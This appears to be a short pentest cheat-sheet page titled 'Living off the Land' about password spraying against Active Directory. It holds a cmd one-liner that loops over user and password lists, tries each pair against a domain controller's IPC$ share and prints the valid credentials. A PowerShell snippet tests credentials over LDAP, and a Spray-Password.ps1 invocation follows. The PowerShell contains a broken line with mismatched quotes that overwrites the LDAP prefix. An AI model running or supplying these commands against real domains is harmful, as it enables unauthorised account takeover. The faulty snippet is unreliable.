# Living off the Land

TODO: Add more knowledge to Linux for password reuse

```
C:\> @for /f %n in (users.lst) do @for /f %p in (passwords.lst) do @net use \\<domain_controller_target>\IPC$ /user:<domain>\%n %p 1>nul 2>&1 && @echo [*] %n:%p && @net use /delete \\<domain_controller_target>\IPC$ > nul
```

```powershell
PS C:\> Get-Content .\enumerateADpassword.ps1
$domainObj = [System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()

$PDC = ($domainObj.PdcRoleOwner).Name

$SearchString = "LDAP://"
$SearchString = "$PDC + "/"

$DistinguishedName = "DC=$($domainObj.Name.Replace('.', ',DC='))"

$SearchString += $DistinguishedName

New-Object System.DirectoryServices.DirectoryEntry($SearchString, "<username>", "<password>")

PS C:\> .\Spray-Password.ps1 -Pass <password> -Admin
```